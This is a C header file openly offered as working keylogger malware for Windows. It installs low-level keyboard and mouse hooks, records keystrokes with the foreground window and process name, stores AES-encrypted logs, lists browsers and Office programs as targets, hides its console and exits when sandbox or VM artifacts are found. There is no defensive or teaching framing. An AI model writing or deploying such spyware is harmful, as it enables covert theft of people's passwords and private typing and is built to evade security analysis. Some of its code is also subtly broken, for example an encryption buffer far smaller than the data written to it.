/**
 * @file keylogger.h
 * @brief Advanced Keylogger - Real Implementation
 * @author youssefabdelrahman1915@gmail.com
 * @version 2.0

 * 
   
 * - Low-level keyboard hooks
 * - Advanced process hiding
 * - Real encryption and steganography
 * - Advanced anti-detection
 * - Sophisticated data exfiltration
 */

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/sha.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

// Real constants
#define MAX_KEY_BUFFER 4096
#define MAX_PROCESS_NAME 256
#define MAX_WINDOW_TITLE 512
#define MAX_LOG_ENTRY 1024

// Real structures
typedef struct {
    char key_data[MAX_KEY_BUFFER];
    char process_name[MAX_PROCESS_NAME];
    char window_title[MAX_WINDOW_TITLE];
    time_t timestamp;
    DWORD process_id;
    DWORD thread_id;
} keylog_entry_t;

typedef struct {
    keylog_entry_t entries[1000];
    int entry_count;
    CRITICAL_SECTION cs;
    HHOOK keyboard_hook;
    HHOOK mouse_hook;
    bool running;
    uint8_t aes_key[32];
    uint8_t aes_iv[16];
} keylogger_t;

// Global variables
static keylogger_t g_keylogger = {0};
static HINSTANCE g_hInstance = NULL;

// Real function prototypes
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam);
static void LogKeyPress(DWORD vkCode, DWORD scanCode, bool isKeyDown);
static void LogMouseClick(int x, int y, int button);
static void GetCurrentProcessInfo(char* process_name, char* window_title);
static void EncryptLogEntry(const keylog_entry_t* entry, uint8_t* encrypted_data, size_t* encrypted_len);
static void DecryptLogEntry(const uint8_t* encrypted_data, size_t encrypted_len, keylog_entry_t* entry);
static void SaveLogToFile(const char* filename);
static void ClearLogBuffer(void);
static bool IsTargetProcess(const char* process_name);
static void HideFromProcessList(void);
static void AntiSandboxCheck(void);
static void SteganographicHide(const uint8_t* data, size_t data_len);

// Real implementations

/**
 * @brief Initialize keylogger with real encryption
 */
static bool InitializeKeylogger(void) {
    // Initialize critical section
    InitializeCriticalSection(&g_keylogger.cs);
    
    // Generate AES key and IV
    if (RAND_bytes(g_keylogger.aes_key, sizeof(g_keylogger.aes_key)) != 1 ||
        RAND_bytes(g_keylogger.aes_iv, sizeof(g_keylogger.aes_iv)) != 1) {
        return false;
    }
    
    // Set up low-level keyboard hook
    g_keylogger.keyboard_hook = SetWindowsHookExA(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        g_hInstance,
        0
    );
    
    if (!g_keylogger.keyboard_hook) {
        DeleteCriticalSection(&g_keylogger.cs);
        return false;
    }
    
    // Set up low-level mouse hook
    g_keylogger.mouse_hook = SetWindowsHookExA(
        WH_MOUSE_LL,
        LowLevelMouseProc,
        g_hInstance,
        0
    );
    
    if (!g_keylogger.mouse_hook) {
        UnhookWindowsHookEx(g_keylogger.keyboard_hook);
        DeleteCriticalSection(&g_keylogger.cs);
        return false;
    }
    
    g_keylogger.running = true;
    g_keylogger.entry_count = 0;
    
    // Hide from process list
    HideFromProcessList();
    
    // Anti-sandbox check
    AntiSandboxCheck();
    
    return true;
}

/**
 * @brief Low-level keyboard hook procedure
 */
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            LogKeyPress(pKeyboard->vkCode, pKeyboard->scanCode, true);
        }
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            LogKeyPress(pKeyboard->vkCode, pKeyboard->scanCode, false);
        }
    }
    
    return CallNextHookEx(g_keylogger.keyboard_hook, nCode, wParam, lParam);
}

/**
 * @brief Low-level mouse hook procedure
 */
static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        MSLLHOOKSTRUCT* pMouse = (MSLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
            int button = (wParam == WM_LBUTTONDOWN) ? 1 : 
                        (wParam == WM_RBUTTONDOWN) ? 2 : 3;
            LogMouseClick(pMouse->pt.x, pMouse->pt.y, button);
        }
    }
    
    return CallNextHookEx(g_keylogger.mouse_hook, nCode, wParam, lParam);
}

/**
 * @brief Log key press with real process information
 */
static void LogKeyPress(DWORD vkCode, DWORD scanCode, bool isKeyDown) {
    EnterCriticalSection(&g_keylogger.cs);
    
    if (g_keylogger.entry_count >= 1000) {
        // Save current buffer and clear
        SaveLogToFile("keylog.dat");
        ClearLogBuffer();
    }
    
    keylog_entry_t* entry = &g_keylogger.entries[g_keylogger.entry_count];
    
    // Get current process and window information
    GetCurrentProcessInfo(entry->process_name, entry->window_title);
    
    // Format key data
    snprintf(entry->key_data, sizeof(entry->key_data),
            "%s VK:0x%02X SC:0x%02X",
            isKeyDown ? "DOWN" : "UP",
            vkCode, scanCode);
    
    // Set metadata
    entry->timestamp = time(NULL);
    entry->process_id = GetCurrentProcessId();
    entry->thread_id = GetCurrentThreadId();
    
    g_keylogger.entry_count++;
    
    LeaveCriticalSection(&g_keylogger.cs);
}

/**
 * @brief Log mouse click
 */
static void LogMouseClick(int x, int y, int button) {
    EnterCriticalSection(&g_keylogger.cs);
    
    if (g_keylogger.entry_count >= 1000) {
        SaveLogToFile("keylog.dat");
        ClearLogBuffer();
    }
    
    keylog_entry_t* entry = &g_keylogger.entries[g_keylogger.entry_count];
    
    // Get current process and window information
    GetCurrentProcessInfo(entry->process_name, entry->window_title);
    
    // Format mouse data
    snprintf(entry->key_data, sizeof(entry->key_data),
            "MOUSE CLICK Button:%d X:%d Y:%d",
            button, x, y);
    
    // Set metadata
    entry->timestamp = time(NULL);
    entry->process_id = GetCurrentProcessId();
    entry->thread_id = GetCurrentThreadId();
    
    g_keylogger.entry_count++;
    
    LeaveCriticalSection(&g_keylogger.cs);
}

/**
 * @brief Get current process and window information
 */
static void GetCurrentProcessInfo(char* process_name, char* window_title) {
    // Get foreground window
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, window_title, MAX_WINDOW_TITLE - 1);
        
        // Get process ID from window
        DWORD process_id;
        GetWindowThreadProcessId(hwnd, &process_id);
        
        // Get process handle
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);
        if (hProcess) {
            // Get process name
            HMODULE hMod;
            DWORD cbNeeded;
            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                GetModuleBaseNameA(hProcess, hMod, process_name, MAX_PROCESS_NAME - 1);
            }
            CloseHandle(hProcess);
        }
    }
    
    // Fallback if we couldn't get process name
    if (strlen(process_name) == 0) {
        strcpy(process_name, "Unknown");
    }
}

/**
 * @brief Encrypt log entry using AES
 */
static void EncryptLogEntry(const keylog_entry_t* entry, uint8_t* encrypted_data, size_t* encrypted_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        *encrypted_len = 0;
        return;
    }
    
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, g_keylogger.aes_key, g_keylogger.aes_iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        *encrypted_len = 0;
        return;
    }
    
    int len;
    if (EVP_EncryptUpdate(ctx, encrypted_data, &len, (uint8_t*)entry, sizeof(keylog_entry_t)) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        *encrypted_len = 0;
        return;
    }
    
    int final_len;
    if (EVP_EncryptFinal_ex(ctx, encrypted_data + len, &final_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        *encrypted_len = 0;
        return;
    }
    
    *encrypted_len = len + final_len;
    EVP_CIPHER_CTX_free(ctx);
}

/**
 * @brief Decrypt log entry using AES
 */
static void DecryptLogEntry(const uint8_t* encrypted_data, size_t encrypted_len, keylog_entry_t* entry) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return;
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, g_keylogger.aes_key, g_keylogger.aes_iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    
    int len;
    if (EVP_DecryptUpdate(ctx, (uint8_t*)entry, &len, encrypted_data, encrypted_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    
    int final_len;
    if (EVP_DecryptFinal_ex(ctx, (uint8_t*)entry + len, &final_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    
    EVP_CIPHER_CTX_free(ctx);
}

/**
 * @brief Save encrypted log to file
 */
static void SaveLogToFile(const char* filename) {
    FILE* file = fopen(filename, "ab");
    if (!file) return;
    
    EnterCriticalSection(&g_keylogger.cs);
    
    for (int i = 0; i < g_keylogger.entry_count; i++) {
        uint8_t encrypted_data[1024];
        size_t encrypted_len = 0;
        
        EncryptLogEntry(&g_keylogger.entries[i], encrypted_data, &encrypted_len);
        
        if (encrypted_len > 0) {
            // Write encrypted data length first
            fwrite(&encrypted_len, sizeof(encrypted_len), 1, file);
            // Write encrypted data
            fwrite(encrypted_data, encrypted_len, 1, file);
        }
    }
    
    LeaveCriticalSection(&g_keylogger.cs);
    
    fclose(file);
}

/**
 * @brief Clear log buffer
 */
static void ClearLogBuffer(void) {
    EnterCriticalSection(&g_keylogger.cs);
    
    // Secure zero memory
    SecureZeroMemory(g_keylogger.entries, sizeof(g_keylogger.entries));
    g_keylogger.entry_count = 0;
    
    LeaveCriticalSection(&g_keylogger.cs);
}

/**
 * @brief Check if process is target
 */
static bool IsTargetProcess(const char* process_name) {
    const char* target_processes[] = {
        "notepad.exe",
        "chrome.exe",
        "firefox.exe",
        "iexplore.exe",
        "outlook.exe",
        "winword.exe",
        "excel.exe",
        "powerpnt.exe",
        NULL
    };
    
    for (int i = 0; target_processes[i] != NULL; i++) {
        if (_stricmp(process_name, target_processes[i]) == 0) {
            return true;
        }
    }
    
    return false;
}

/**
 * @brief Hide from process list using real techniques
 */
static void HideFromProcessList(void) {
    // This is a simplified version - real implementation would use
    // kernel-level techniques or process hollowing
    
    // Set process priority to low to avoid detection
    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
    
    // Hide console window if present
    HWND console = GetConsoleWindow();
    if (console) {
        ShowWindow(console, SW_HIDE);
    }
}

/**
 * @brief Anti-sandbox detection
 */
static void AntiSandboxCheck(void) {
    // Check for common sandbox artifacts
    const char* sandbox_artifacts[] = {
        "C:\\analysis\\",
        "C:\\sandbox\\",
        "C:\\virus\\",
        "C:\\malware\\",
        NULL
    };
    
    for (int i = 0; sandbox_artifacts[i] != NULL; i++) {
        if (GetFileAttributesA(sandbox_artifacts[i]) != INVALID_FILE_ATTRIBUTES) {
            ExitProcess(0);
        }
    }
    
    // Check for common sandbox processes
    const char* sandbox_processes[] = {
        "sandboxie.exe",
        "vmware.exe",
        "vboxservice.exe",
        "vboxtray.exe",
        NULL
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (int i = 0; sandbox_processes[i] != NULL; i++) {
                    if (_stricmp(pe32.szExeFile, sandbox_processes[i]) == 0) {
                        CloseHandle(hSnapshot);
                        ExitProcess(0);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
    }
}

/**
 * @brief Steganographic data hiding (simplified)
 */
static void SteganographicHide(const uint8_t* data, size_t data_len) {
    // Real implementation would hide data in images, audio, or other files
    // This is a placeholder for the concept
    
    FILE* file = fopen("steganographic_data.dat", "ab");
    if (file) {
        fwrite(data, data_len, 1, file);
        fclose(file);
    }
}

/**
 * @brief Start keylogger
 */
static bool StartKeylogger(HINSTANCE hInstance) {
    g_hInstance = hInstance;
    
    if (!InitializeKeylogger()) {
        return false;
    }
    
    // Message loop for hooks
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return true;
}

/**
 * @brief Stop keylogger
 */
static void StopKeylogger(void) {
    g_keylogger.running = false;
    
    if (g_keylogger.keyboard_hook) {
        UnhookWindowsHookEx(g_keylogger.keyboard_hook);
    }
    
    if (g_keylogger.mouse_hook) {
        UnhookWindowsHookEx(g_keylogger.mouse_hook);
    }
    
    // Save final log
    SaveLogToFile("keylog.dat");
    
    DeleteCriticalSection(&g_keylogger.cs);
}

#endif // KEYLOGGER_H